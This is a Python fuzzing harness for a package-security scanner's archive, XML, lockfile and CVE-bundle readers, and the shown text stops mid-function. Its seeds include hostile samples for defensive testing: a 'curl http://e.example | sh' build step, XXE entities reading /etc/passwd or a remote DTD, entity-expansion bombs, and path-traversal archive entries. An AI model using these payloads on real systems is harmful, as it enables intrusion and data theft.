"""What the fuzzers run (0.1.9, X-1): each target is a way to feed bytes to one reader of untrusted input, the
well-formed inputs to start from, the words that matter to it, and what must always be true of the answer.

A target's `run(data)` returns when the reader did what it promises, whatever the bytes: it gave an answer, or
refused with the error the reader documents. Anything else is a finding: an exception the reader does not
document, a broken promise (`check` raises `Violation`), or too much time (the driver's limit). The readers:

- `archive-tgz`, `archive-tbz2`, `archive-txz`, `archive-zip`: `registry.repo.iter_archive`, the reader of every
  package archive a registry scan, `lazaret guard` and `github:` scans open (tar by codec, and zip/wheel).
- `xml`, `xml-minidom`: `safexml.ElementTree.fromstring` and `safexml.minidom.parseString`, with the options the
  scanner uses and the limits it can be given.
- `sca-*`: `scanner.sca.scan_all` over one file of each kind the inventory reads (the npm, yarn, pnpm and bun
  lockfiles, poetry.lock, uv.lock, pylock.toml, Pipfile.lock, requirements.txt, pyproject.toml, setup.py).
- `sca-bundle-index`: `scanner.sca_index.IndexedBundle`, the CVE bundle in its indexed file format, run on the bytes as
  given and on the same bytes with every checksum made right (so the checks behind the checksums run too).
- `sca-bundle-doc`: the same bundle both ways: any JSON document through `CveBundle` and through `dump_index` and back
  must say the same about every name it mentions.

Standard library plus this checkout. The seeds are built here, so no fixture is needed."""

import bz2
import gzip
import hashlib
import io
import json
import lzma
import os
import re
import shutil
import tarfile
import tempfile
import warnings
import zipfile
import zlib


class Violation(AssertionError):
    """A promise a reader makes that it did not keep; `rule` names it (the finding's signature)."""

    def __init__(self, rule, detail=""):
        super().__init__(f"{rule}: {detail}" if detail else rule)
        self.rule = rule


def check(condition, rule, detail=""):
    if not condition:
        raise Violation(rule, str(detail)[:300])


class Target:
    def __init__(self, name, summary, seeds, start, dictionary=(), max_len=65536, time_limit=2.0):
        self.name, self.summary, self.seeds, self.start = name, summary, seeds, start
        self.dictionary, self.max_len, self.time_limit = tuple(dictionary), max_len, time_limit


TARGETS = {}

#: Findings reported to the owner of the reader and not fixed yet: (target, signature without its line number)
#: -> (the finding's id in docs/0.1.9-findings.md, a small input that shows it, or None when what it shows depends on
#: the Python version). The driver lists them as known and exits 0 for them; `tests/architecture/test_fuzz_scripts.py`
#: replays each input and fails when it no longer shows the finding, so the entry goes when the reader is fixed.
KNOWN = {
    ("xml", "LookupError@ElementTree.py"): ("F-1", b'<?xml version="1.0" encoding="T7"?><a/>'),
    ("xml", "ValueError@ElementTree.py"): ("F-1", b'<?xml version="1.0" encoding="UTF32"?><a/>'),
    ("xml-minidom", "LookupError@minidom.py"): ("F-1", b'<?xml version="1.0" encoding="T7"?><a/>'),
    ("xml-minidom", "ValueError@minidom.py"): ("F-1", b'<?xml version="1.0" encoding="UTF32"?><a/>'),
    # CPython since April 2024 (3.12.3, 3.13) warns when two entries of a zip start at one place: on stderr, and no anomaly
    ("archive-zip", "warning:UserWarning@repo.py"): ("F-2", None),
    # Python 3.10 (and before): ZipInfo.is_dir() reads the name's last character, an entry with no name has none (3.11+ does not raise)
    ("archive-zip", "IndexError@repo.py"): ("F-6", None),
    # an LZMA entry that declares a dictionary of about 4 GiB: MemoryError where memory is capped (an address-space limit, a small VM)
    ("archive-zip", "MemoryError@repo.py"): ("F-7", None),
}


def known(target, signature):
    """-> the id of the known finding this is, or None."""
    entry = KNOWN.get((target, re.sub(r":\d+$", "", signature)))
    return entry[0] if entry else None


def register(name, summary, seeds, start, dictionary=(), **options):
    TARGETS[name] = Target(name, summary, seeds, start, dictionary, **options)


def pick(data, options):
    """Which of `options` this input is run with: a function of the bytes, so a finding replays the same way."""
    return options[zlib.crc32(data) % len(options)]


# ---------------------------------------------------------------------------------------------- archives

def tar_bytes(members, fmt=tarfile.GNU_FORMAT):
    """members: (name, kind, payload) with kind file | dir | sym | link (payload: the bytes, or the link's target)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w", format=fmt) as tf:
        for name, kind, payload in members:
            info = tarfile.TarInfo(name)
            if kind == "file":
                info.size = len(payload)
                tf.addfile(info, io.BytesIO(payload))
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.type = tarfile.SYMTYPE if kind == "sym" else tarfile.LNKTYPE
                info.linkname = payload.decode("utf-8")
                tf.addfile(info)
    return buf.getvalue()


NPM_FILES = [("package/package.json", "file", b'{"name": "left-pad", "version": "1.3.0", "main": "index.js", '
                                              b'"scripts": {"postinstall": "node setup.js"}}'),
             ("package/index.js", "file", b"module.exports = function pad(s, n) { return String(s).padStart(n); };\n"),
             ("package/lib", "dir", b""),
             ("package/lib/util.js", "file", b"const cp = require('child_process');\nexports.run = c => cp.execSync(c);\n"),
             ("package/link.js", "sym", b"index.js"),
             ("package/README.md", "file", b"# left-pad\n")]
SDIST_FILES = [("pkg-1.0/PKG-INFO", "file", b"Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n"),
               ("pkg-1.0/setup.py", "file", b"from setuptools import setup\nsetup(name='pkg', version='1.0')\n"),
               ("pkg-1.0/pkg/__init__.py", "file", b"import os\nVALUE = os.environ.get('HOME')\n"),
               ("pkg-1.0/pkg/copy.py", "link", b"pkg-1.0/pkg/__init__.py")]
ODD_FILES = [("package/a.js", "file", b"1"), ("package/a.js", "file", b"2"), ("../escape.js", "file", b"x"),
             ("/etc/abs.js", "file", b"x"), ("package/a/../../b.js", "file", b"x"), ("package\\win\\c.js", "file", b"x"),
             ("package/" + "d/" * 60 + "deep.js", "file", b"x"), ("package/long-" + "n" * 150 + ".js", "file", b"x"),
             ("package/empty", "file", b""), ("package/dangling", "sym", b"../../outside"),
             ("package/loop1", "sym", b"loop2"), ("package/loop2", "sym", b"loop1"),
             ("package/hard", "link", b"package/a.js")]


def tar_seeds():
    return [tar_bytes(NPM_FILES), tar_bytes(SDIST_FILES, tarfile.PAX_FORMAT), tar_bytes(ODD_FILES),
            tar_bytes(NPM_FILES, tarfile.PAX_FORMAT), tar_bytes([]), tar_bytes(NPM_FILES) + tar_bytes(SDIST_FILES),
            tar_bytes(NPM_FILES) + b"trailing"]


def tgz_seeds():
    tars = tar_seeds()
    return [gzip.compress(t, mtime=0) for t in tars] + [tars[0], gzip.compress(tars[0], mtime=0) * 2]


def tbz2_seeds():
    return [bz2.compress(t) for t in tar_seeds()] + [tar_seeds()[1]]


def txz_seeds():
    return [lzma.compress(t, format=lzma.FORMAT_XZ) for t in tar_seeds()] + [lzma.compress(tar_seeds()[0],
                                                                                        format=lzma.FORMAT_ALONE)]


def zip_bytes(entries, method=zipfile.ZIP_DEFLATED, comment=b""):
    """entries: (name, payload, kind) with kind file | dir | symlink."""
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")                     # a duplicate name is the point
        with zipfile.ZipFile(buf, "w", method) as zf:
            for name, payload, kind in entries:
                info = zipfile.ZipInfo(name, (1980, 1, 1, 0, 0, 0))
                info.compress_type = method
                if kind == "dir":
                    info.external_attr = 0o40755 << 16
                elif kind == "symlink":
                    info.external_attr = 0o120777 << 16
                else:
                    info.external_attr = 0o100644 << 16
                zf.writestr(info, payload)
            zf.comment = comment
    return buf.getvalue()


WHEEL_FILES = [("pkg/__init__.py", b"import socket\n", "file"), ("pkg/data/", b"", "dir"),
               ("pkg/core.py", b"def f():\n    return 1\n", "file"), ("pkg-1.0.dist-info/METADATA", b"Name: pkg\nVersion: 1.0\n", "file"),
               ("pkg-1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n", "file"), ("pkg-1.0.dist-info/RECORD", b"pkg/__init__.py,,\n", "file"),
               ("pkg/link.py", b"__init__.py", "symlink")]
ODD_ZIP = [("a.py", b"1", "file"), ("a.py", b"2", "file"), ("../escape.py", b"x", "file"), ("/abs.py", b"x", "file"),
           ("dir\\win.py", b"x", "file"), ("c:/drive.py", b"x", "file"), ("e" * 300 + ".py", b"x", "file"), ("empty", b"", "file")]


def zip_seeds():
    return [zip_bytes(WHEEL_FILES), zip_bytes(WHEEL_FILES, zipfile.ZIP_STORED), zip_bytes(WHEEL_FILES, zipfile.ZIP_BZIP2),
            zip_bytes(WHEEL_FILES, zipfile.ZIP_LZMA), zip_bytes(ODD_ZIP), zip_bytes([]), zip_bytes(WHEEL_FILES, comment=b"note"),
            zip_bytes(ODD_ZIP, zipfile.ZIP_STORED)]


REASONS = (None, "member", "files", "total", "time", "corrupt")
BUDGET_TOTAL = 32 * 1024 * 1024


def read_archive(repo, data, container, artifact):
    """-> a summary of everything `iter_archive` yields, after checking what it promises of each part."""
    budget = repo.Budget(total=BUDGET_TOTAL)
    anomalies, summary, stopped, total, files = [], [], None, 0, 0
    for item in repo.iter_archive(data, container, artifact, budget=budget, anomalies=anomalies):
        check(stopped is None, "archive-after-stop", f"{item[0]!r} after a {stopped!r} member")
        check(isinstance(item, repo.Member) and len(item) == 4, "archive-member-shape", repr(item)[:80])
        rel, size, raw, reason = item
        check(isinstance(rel, str) and rel != "", "archive-path-type", repr(rel))
        check(isinstance(size, int) and not isinstance(size, bool) and size >= 0, "archive-size-type", repr(size))
        check(isinstance(raw, (bytes, bytearray)), "archive-bytes-type", type(raw))
        check(reason in REASONS, "archive-reason", repr(reason))
        check(isinstance(item.detail, str), "archive-detail-type", repr(item.detail))
        if reason is None:
            check(size == len(raw), "archive-real-size", f"{rel!r}: {size} declared, {len(raw)} read")
            check(size <= repo.MAX_MEMBER, "archive-member-limit", f"{rel!r}: {size}")
            check(not rel.startswith("/") and ".." not in rel.split("/") and "\\" not in rel and rel not in (".", ""),
                  "archive-member-path", repr(rel))
            total += len(raw)
            files += 1
        elif reason == "member":
            check(len(raw) <= repo.SAMPLE, "archive-sample-limit", f"{rel!r}: {len(raw)} bytes")
        elif reason in ("files", "total", "time"):
            stopped = reason
        summary.append((rel, size, hashlib.sha1(bytes(raw)).digest(), reason, item.detail))
    check(total <= BUDGET_TOTAL, "archive-budget", f"{total} bytes read against {BUDGET_TOTAL}")
    check(files <= repo.MAX_FILES, "archive-file-limit", files)
    for anomaly in anomalies:
        check(isinstance(anomaly, tuple) and len(anomaly) == 3 and all(isinstance(x, str) for x in anomaly),
              "archive-anomaly-shape", repr(anomaly)[:100])
    return summary, anomalies


def archive_target(container, artifacts):
    def start():
        from lazaret.registry import repo

        def run(data):
            artifact = pick(data, artifacts)
            first = read_archive(repo, data, container, artifact)
            check(first == read_archive(repo, data, container, artifact), "archive-deterministic", container)
        return run, lambda: None
    return start


TAR_WORDS = (b"ustar\x0000", b"ustar  \x00", b"././@LongLink", b"pax_global_header", b"0000644\x00", b"00000000000\x00",
             b"package/", b"../", b"/", b"\x00" * 512, b"\x1f\x8b\x08\x00", b"BZh9", b"\xfd7zXZ\x00", b"PK\x03\x04", b"PK\x05\x06",
             b"PK\x01\x02", b"PK\x06\x06", b"PK\x06\x07", b"\xff\xff\xff\xff", b"20 path=")
register("archive-tgz", "registry.repo.iter_archive on npm and sdist tarballs (gzip, or plain tar)", tgz_seeds,
         archive_target("tgz", (None, "npm", "wheel")), TAR_WORDS, max_len=32768)
register("archive-tbz2", "registry.repo.iter_archive on bzip2 tarballs", tbz2_seeds,
         archive_target("tbz2", (None, "npm")), TAR_WORDS, max_len=32768)
register("archive-txz", "registry.repo.iter_archive on xz and lzma tarballs", txz_seeds,
         archive_target("txz", (None, "npm")), TAR_WORDS, max_len=32768)
register("archive-zip", "registry.repo.iter_archive on wheels and zip sdists", zip_seeds,
         archive_target("zip", (None, "wheel")), TAR_WORDS, max_len=32768)


# ---------------------------------------------------------------------------------------------------- xml

XML_SEEDS = [
    b'<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"><modelVersion>4.0.0</modelVersion>'
    b'<dependencies><dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13</version></dependency>'
    b'</dependencies></project>',
    b'<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><PackageReference Include="Newtonsoft.Json" Version="13.0.1" /></ItemGroup>'
    b'<Target Name="x"><Exec Command="curl http://e.example | sh" /></Target></Project>',
    b'<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">'
    b'<plist version="1.0"><dict><key>RunAtLoad</key><true/><key>Program</key><string>/tmp/x</string></dict></plist>',
    b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script><![CDATA[alert(1)]]></script>'
    b'<use xlink:href="#a"/><!-- note --><?pi data?></svg>',
    b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x "y"><!ENTITY z "&x;&x;&x;">]><a b="&z;">&z;&#65;&#x42;</a>',
    b'<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
    b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><l>&c;</l>',
    b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY e SYSTEM "file:///etc/passwd">]><a>&e;</a>',
    b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % p SYSTEM "http://e.example/x.dtd">%p;]><a/>',
    b'<!DOCTYPE a [<!ELEMENT a ANY><!ATTLIST a x CDATA "default value" y CDATA "other default value">]><a/>',
    b'<feed xmlns="http://www.w3.org/2005/Atom"><entry><title>t</title><link href="http://e.example/"/></entry></feed>',
    '<?xml version="1.0" encoding="UTF-16"?><a>\u00e9\u4e2d</a>'.encode("utf-16"),
    b'<?xml version="1.0" encoding="ISO-8859-1"?><a>\xe9</a>',
    b"<a>" + b"<b>" * 40 + b"x" + b"</b>" * 40 + b"</a>",
    b'<a:b xmlns:a="u" a:c="d"><e xmlns="v"/></a:b>']
XML_WORDS = (b"<!DOCTYPE", b"<!ENTITY", b"<!ATTLIST", b"<!ELEMENT", b"<!NOTATION", b"SYSTEM", b"PUBLIC", b'"file:///etc/passwd"',
             b"%", b"&#x", b"&#", b"&amp;", b"<![CDATA[", b"]]>", b"<?xml", b'encoding="', b"xmlns:", b"xml:", b"<!--", b"-->",
             b'standalone="yes"', b"\xff\xfe", b"\xef\xbb\xbf", b'CDATA "', b"NDATA", b"ANY", b"EMPTY", b"#REQUIRED", b"#FIXED")
XML_OPTIONS = ({}, {"forbid_dtd": True}, {"forbid_entities": False}, {"max_depth": 6}, {"max_bytes": 512},
               {"forbid_entities": False, "max_attlist_defaults": 256}, {"forbid_external": False, "forbid_entities": False})


def xml_etree_start():
    from xml.parsers import expat

    from lazaret.safexml import ElementTree as ET
    from lazaret.safexml._common import AMPLIFICATION_FACTOR, AMPLIFICATION_THRESHOLD, SafeXMLError

    def run(data):
        options = pick(data, XML_OPTIONS)
        try:
            root = ET.fromstring(data, **options)
        except (ET.ParseError, SafeXMLError, expat.ExpatError):
            return
        check(isinstance(root.tag, str), "xml-tag-type", repr(root.tag))
        nodes = size = 0
        for element in root.iter():
            nodes += 1
            size += len(element.text or "") + len(element.tail or "") + sum(len(k) + len(v) for k, v in element.attrib.items())
        check(nodes <= len(data) // 3 + 1, "xml-node-count", f"{nodes} elements from {len(data)} bytes")
        check(size <= AMPLIFICATION_FACTOR * len(data) + 2 * AMPLIFICATION_THRESHOLD, "xml-amplification",
              f"{size} characters from {len(data)} bytes ({options})")
    return run, lambda: None


def xml_minidom_start():
    from xml.parsers import expat

    from lazaret.safexml import ElementTree as ET
    from lazaret.safexml import minidom
    from lazaret.safexml._common import SafeXMLError

    def run(data):
        try:
            minidom.parseString(data, **pick(data, XML_OPTIONS))
        except (ET.ParseError, SafeXMLError, expat.ExpatError):
            pass
    return run, lambda: None


register("xml", "safexml ElementTree.fromstring, with the options and limits the scanner can give it",
         lambda: list(XML_SEEDS), xml_etree_start, XML_WORDS, max_len=16384)
register("xml-minidom", "safexml minidom.parseString, with the same options", lambda: list(XML_SEEDS),
         xml_minidom_start, XML_WORDS, max_len=16384)


# ------------------------------------------------------------------------------------------- lockfiles

def j(value):
    return json.dumps(value, indent=2).encode("utf-8")


SCA_SEEDS = {
    "package-lock.json": [
        j({"name": "app", "lockfileVersion": 3, "packages": {
            "": {"name": "app", "dependencies": {"lodash": "^4.17.0"}},
            "node_modules/lodash": {"version": "4.17.20", "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz"},
            "node_modules/a/node_modules/@scope/b": {"version": "1.0.0"},
            "node_modules/alias": {"name": "real", "version": "npm:real@2.0.0"},
            "node_modules/git": {"version": "git+ssh://git@example.com/x/y.git#abc"},
            "packages/ws": {"version": "1.0.0"}, "node_modules/ws": {"link": True, "resolved": "packages/ws"}}}),
        j({"name": "app", "lockfileVersion": 1, "dependencies": {"a": {"version": "1.0.0", "dependencies": {
            "b": {"version": "2.0.0", "dependencies": {"c": {"version": "3.0.0"}}}}}, "weird": "1.0.0"}})],
    "yarn.lock": [
        b'# yarn lockfile v1\n\n\nlodash@^4.17.20, lodash@^4.17.21:\n  version "4.17.21"\n  resolved "https://x/lodash.tgz#abc"\n'
        b'  integrity sha512-x\n\n"@scope/pkg@^1.0.0":\n  version "1.2.3"\n  dependencies:\n    lodash "^4.0.0"\n',
        b'__metadata:\n  version: 6\n\n"alias@npm:real@^1.0.0":\n  version: 1.4.0\n  resolution: "real@npm:1.4.0"\n  languageName: node\n\n'
        b'"app@workspace:.":\n  version: 0.0.0-use.local\n  resolution: "app@workspace:."\n'],
    "pnpm-lock.yaml": [
        b"lockfileVersion: '9.0'\n\nimporters:\n  .:\n    dependencies:\n      lodash:\n        specifier: ^4.17.0\n        version: 4.17.21\n\n"
        b"packages:\n\n  lodash@4.17.21:\n    resolution: {integrity: sha512-x}\n\n  '@scope/pkg@1.0.0(peer@2.0.0)':\n    resolution: {integrity: sha512-y}\n\n"
        b"  pkg@https://codeload.github.com/o/r/tar.gz/abc:\n    resolution: {tarball: x}\n\nsnapshots:\n\n  lodash@4.17.21: {}\n",
        b"lockfileVersion: 5.4\n\npackages:\n\n  /lodash/4.17.21:\n    resolution: {integrity: sha512-x}\n\n  /@scope/pkg/1.0.0_peer@2.0.0:\n    dev: true\n\n"
        b"  github.com/o/r/abc:\n    name: gitpkg\n    version: 1.0.0\n"],
    "bun.lock": [
        b'{\n  "lockfileVersion": 1,\n  "workspaces": {"": {"name": "app"}},\n  "packages": {\n    // a comment\n'
        b'    "lodash": ["lodash@4.17.21", "", {}, "sha512-x"],\n    "old-lodash": ["lodash@4.17.15", "", {}, "sha512-y"],\n'
        b'    "chalk/supports-color": ["supports-color@7.2.0", "", {"dependencies": {"has-flag": "^4.0.0"}}, "sha512-z"],\n'
        b'    "ws": ["ws@workspace:packages/ws"],\n  },\n}\n'],
    "poetry.lock": [
        b'[[package]]\nname = "requests"\nversion = "2.31.0"\ndescription = "x"\noptional = false\npython-versions = ">=3.7"\n\n'
        b'[package.dependencies]\nurllib3 = ">=1.21,<3"\n\n[[package]]\nname = "Django"\nversion = "4.2"\n\n[package.source]\ntype = "git"\n'
        b'url = "https://example.com/x.git"\nreference = "main"\n\n[metadata]\nlock-version = "2.0"\ncontent-hash = "abc"\n'],
    "uv.lock": [
        b'version = 1\nrequires-python = ">=3.9"\n\n[[package]]\nname = "requests"\nversion = "2.31.0"\nsource = { registry = "https://pypi.org/simple" }\n'
        b'dependencies = [\n    { name = "urllib3" },\n]\n\n[[package]]\nname = "app"\nversion = "0.1.0"\nsource = { virtual = "." }\n'],
    "pylock.toml": [
        b'lock-version = "1.0"\ncreated-by = "x"\nrequires-python = ">=3.9"\n\n[[packages]]\nname = "requests"\nversion = "2.31.0"\n\n'
        b'[[packages.wheels]]\nname = "requests-2.31.0-py3-none-any.whl"\nurl = "https://x/requests.whl"\n\n[packages.wheels.hashes]\nsha256 = "abc"\n'],
    "Pipfile.lock": [
        j({"_meta": {"hash": {"sha256": "abc"}, "pipfile-spec": 6}, "default": {
            "requests": {"hashes": ["sha256:abc"], "version": "==2.31.0"}, "vcs": {"git": "https://example.com/x.git", "ref": "abc"},
            "loose": {"version": "*"}}, "develop": {"pytest": {"version": "==7.4.0", "markers": "python_version >= '3.7'"}}})],
    "requirements.txt": [
        b"# a comment\nrequests==2.31.0 \\\n    --hash=sha256:abc\nflask>=2.0,<3 ; python_version >= '3.8'\n-r other.txt\n-c constraints.txt\n"
        b"--index-url https://example.com/simple\ngit+https://github.com/o/r.git#egg=r\nhttps://example.com/pkg-1.0.tar.gz\n"
        b"-e .\nrequests[security,socks]~=2.0 # trailing\npkg @ https://example.com/pkg.whl\n./local/path\n"],
    "pyproject.toml": [
        b'[project]\nname = "app"\nversion = "1.0"\ndependencies = ["requests>=2", "click[extras]==8.1.0 ; python_version > \'3.8\'"]\n'
        b'optional-dependencies = { dev = ["pytest"] }\n\n[dependency-groups]\ntest = ["coverage", {include-group = "dev"}]\n\n'
        b'[tool.poetry.dependencies]\npython = "^3.9"\nflask = { version = "^2.0", extras = ["async"] }\ndjango = "4.2"\n'
        b'git = { git = "https://example.com/x.git", tag = "v1" }\n\n[tool.poetry.group.dev.dependencies]\npytest = "^7"\n'],
    "setup.py": [
        b"from setuptools import setup\nREQS = ['requests>=2', 'click']\nsetup(\n    name='x', version='1',\n    install_requires=REQS + ['six==1.16.0'],\n"
        b"    setup_requires=['wheel'],\n    extras_require={'dev': ['pytest'], 'docs': ('sphinx',)},\n    tests_require=[\"mock\" \"ito\"],\n)\n"],
}
SCA_WORDS = (b'"version"', b'"dependencies"', b'"packages"', b'"node_modules/', b'"resolved"', b'"link": true', b'"name"', b"workspace:", b"link:",
             b"file:", b"npm:", b"git+ssh://", b"github.com/", b"@", b"=", b"==", b">=", b"~=", b"!=", b";", b"[", b"]", b"{", b"}", b"[[package]]",
             b"[tool.poetry", b"[project]", b"-r ", b"-c ", b"-e ", b"\\\n", b"\r\n", b"\xef\xbb\xbf", b"\t", b"#", b'"""', b"'''", b"\\u0000",
             b"inf", b"nan", b"1e999", b"0x", b"+", b"install_requires", b"setup(", b"**", b"*", b"lambda", b"import ")


def sca_start(filename):
    def start():
        from lazaret.scanner import sca
        folder = tempfile.mkdtemp(prefix="lazaret-fuzz-")
        path = os.path.join(folder, filename)

        def run(data):
            with open(path, "wb") as fh:
                fh.write(data)
            warned = []
            inventory = sca.scan_all(folder, warn=lambda kind, n=1: warned.append((kind, n)))
            check(isinstance(inventory, sca.Inventory), "sca-result-type", type(inventory).__name__)
            check(len(inventory) <= len(data) + 1, "sca-entry-count", f"{len(inventory)} entries from {len(data)} bytes")
            for entry in inventory:
                check(isinstance(entry, tuple) and len(entry) == 4 and all(isinstance(x, str) for x in entry),
                      "sca-entry-shape", repr(entry)[:120])
                check(entry[0] in ("npm", "pypi") and entry[1], "sca-entry-values", repr(entry)[:120])
            for kind, n in warned:
                check(isinstance(kind, str) and isinstance(n, int), "sca-warning-shape", repr((kind, n)))

        def close():
            shutil.rmtree(folder, ignore_errors=True)
        return run, close
    return start


def sca_seeds(filename):
    return lambda: list(SCA_SEEDS[filename])


for _filename in SCA_SEEDS:
    register("sca-" + _filename.lower().replace(".", "-").replace("_", "-").replace("--", "-"),
             f"scanner.sca.scan_all reading {_filename}", sca_seeds(_filename), sca_start(_filename), SCA_WORDS, max_len=16384)


# ----------------------------------------------------------------------------------------------- CVE bundles

def bundle_json(*advisories, **top):
    return j(dict({"bundleVersion": 1, "generatedAt": "2026-10-01T00:00:00Z", "sources": ["osv:npm"],
                   "counts": {"advisories": len(advisories)}, "advisories": list(advisories)}, **top))


BUNDLE_DOCS = [
    bundle_json(
        {"cve": "CVE-2099-0001", "title": "lodash", "cvss": 9.8, "knownExploited": True,
         "packages": [{"name": "lodash", "ecosystem": "npm", "exact": True,
                       "ranges": [{"fromVersion": "0", "toVersion": "4.17.12", "toInclusive": False}]}]},
        {"cve": "CVE-2099-0002", "packages": [{"name": "python-urllib3", "ecosystem": None, "exact": False,
                                               "ranges": [{"fromVersion": "1.0", "toVersion": "1.26.17"}]},
                                              {"name": "Django", "ecosystem": "pypi", "exact": True, "ranges": []}]},
        {"cve": "CVE-2099-0003", "malicious": True, "packages": [{"name": "@scope/pkg", "ecosystem": "npm", "exact": True,
                                                                  "ranges": [{}]}]}),
    bundle_json({"id": "GHSA-aaaa-bbbb-cccc", "cvss": "bad", "packages": [{"name": "requests", "ecosystem": "pypi",
                                                                            "exact": True, "ranges": "no"}, None, {"name": 5}]},
                "junk", {"cve": "CVE-2099-0004", "packages": "no"}),
    bundle_json(),
]
BUNDLE_WORDS = (b'"bundleVersion"', b'"advisories"', b'"packages"', b'"exact"', b'"ranges"', b'"fromVersion"', b'"toVersion"',
                b'"toInclusive"', b'"ecosystem"', b'"npm"', b'"pypi"', b'"name"', b'"cve"', b'"id"', b'"cvss"', b'"epss"',
                b'"knownExploited"', b'"malicious"', b'"generatedAt"', b'"sources"', b'"counts"', b"null", b"true", b"false",
                b"NaN", b"Infinity", b"-1", b"1e999", b'"python-', b'"py-', b'"@', b"\\ud800", b"\\u0000", b"[[", b"{}")
INDEX_WORDS = (b"LZSCAIDX", b"\x01\x00\x00\x00", b"\x00\x00\x00\x00", b"\xff\xff\xff\xff", b"\xff" * 8, b"E\x00npm\x00",
               b"L\x00", b"x\x9c", b"x\xda", b'{"k":', b'{"n":', b'"p":[[', b'"a":{', b"]]}", b"\x00" * 16)


def index_seeds():
    from lazaret.scanner import sca_index
    out = []
    for text in BUNDLE_DOCS:
        buf = io.BytesIO()
        sca_index.dump_index(json.loads(text), buf)
        out.append(buf.getvalue())
    return out


def repair_index(data):
    """`data` with the file length and every checksum made right, so that a changed file gets past the checks that
    would refuse nearly all of them and the reader's other checks are what run."""
    from lazaret.scanner import sca_index as ix
    if len(data) < ix.HEADER.size:
        return data
    out = bytearray(data)
    f = list(ix.HEADER.unpack_from(out))
    f[1], f[2], f[3] = ix.FORMAT, 0, len(out)
    n_adv, n_keys = min(f[4], 4096), min(f[5], 4096)
    meta_off, meta_len, advtab_off, keytab_off, blobs_off = f[7:12]

    def inside(off, length):
        return 0 <= off and 0 <= length and off + length <= len(out)

    def crc(off, length):
        return zlib.crc32(bytes(out[off:off + length])) if inside(off, length) else 0

    for table_off, count, entry in ((advtab_off, n_adv, ix.ADV_ENTRY), (keytab_off, n_keys, ix.KEY_ENTRY)):
        for i in range(count):
            at = table_off + i * entry.size
            if not inside(at, entry.size):
                break
            fields = list(entry.unpack_from(out, at))
            if entry is ix.ADV_ENTRY:
                fields[2] = crc(blobs_off + fields[0], fields[1])
            else:
                fields[3] = crc(blobs_off + fields[1], fields[2])
            entry.pack_into(out, at, *fields)
    f[12] = crc(meta_off, meta_len)
    f[13] = crc(advtab_off, ix.ADV_ENTRY.size * f[4])
    f[14] = crc(keytab_off, ix.KEY_ENTRY.size * f[5])
    f[15] = 0
    f[15] = zlib.crc32(ix.HEADER.pack(*f))
    ix.HEADER.pack_into(out, 0, *f)
    return bytes(out)


def names_in(advisories):
    """The package names a bundle mentions (and a few that fold to them), to look up."""
    names = {"lodash", "python-urllib3", "urllib3", "Django", "@scope/pkg"}
    for adv in advisories:
        for pkg in adv.get("packages") or ():
            if isinstance(pkg, dict) and isinstance(pkg.get("name"), str):
                name = pkg["name"]
                names.update((name, name.lower(), name.replace("-", "_"), "python-" + name))
    return sorted(names)[:64]


def index_start():
    from lazaret.scanner import sca_index
    folder = tempfile.mkdtemp(prefix="lazaret-fuzz-")
    path = os.path.join(folder, "bundle.lzx")

    def read(data):
        with open(path, "wb") as fh:
            fh.write(data)
        try:
            bundle = sca_index.IndexedBundle.open(path)
        except ValueError:                       # the refusal the reader documents (a damaged or unknown file)
            return None
        with bundle:
            try:
                checked = bundle.verify()
            except ValueError:
                checked = None
            count = len(bundle.advisories)
            check(count <= len(data) // sca_index.ADV_ENTRY.size, "index-advisory-count", f"{count} advisories in {len(data)} bytes")
            answers, errors = {}, 0
            advisories = []
            for n in range(min(count, 200)):
                try:
                    advisories.append(bundle.advisories[n])
                except ValueError:
                    errors += 1
            for name in names_in(advisories):
                for eco in (None, "npm", "pypi"):
                    try:
                        found = bundle.advisories_for(name, eco)
                    except ValueError:
                        errors += 1
                        continue
                    check(isinstance(found, list) and all(isinstance(p, tuple) and len(p) == 2 and isinstance(p[0], dict)
                                                          and isinstance(p[1], dict) for p in found), "index-answer-shape", repr(found)[:120])
                    for adv, pkg in found:
                        check(isinstance(adv.get("cve"), str) and isinstance(pkg.get("name"), str), "index-answer-values",
                              repr((adv.get("cve"), pkg.get("name")))[:120])
                        check(any(pkg is p for p in adv["packages"]), "index-answer-package", repr(pkg)[:120])
                    answers[(name, eco)] = found
            check(not (checked is not None and errors), "index-checked-then-damaged",
                  f"{errors} lookups failed on a file that passed its check")
            return answers

    def run(data):
        for variant in (data, repair_index(data)):
            first = read(variant)
            if first is not None:
                check(read(variant) == first, "index-deterministic", "two reads of one file differ")

    def close():
        shutil.rmtree(folder, ignore_errors=True)
    return run, close


def doc_start():
    from lazaret.scanner import core, sca, sca_index

    def run(data):
        try:
            doc = core.json_loads_bounded(data.decode("utf-8"))
        except (ValueError, RecursionError):
            return
        try:
            plain = sca.CveBundle(doc)
        except ValueError:
            plain = None
        buf = io.BytesIO()
        try:
            summary = sca_index.dump_index(doc, buf)
        except ValueError:
            return                               # refused: a document the index cannot hold (NaN) or one that is no bundle
        check(plain is not None, "bundle-doc-refusal", "the index accepted a document the JSON bundle refuses")
        path = os.path.join(folder, "doc.lzx")
        with open(path, "wb") as fh:
            fh.write(buf.getvalue())
        with sca_index.IndexedBundle.open(path) as indexed:
            check(summary["warnings"] == plain.warnings.lines() == indexed.warnings.lines(), "bundle-doc-warnings",
                  repr((summary["warnings"], plain.warnings.lines())))
            check(len(indexed.advisories) == len(plain.advisories), "bundle-doc-count",
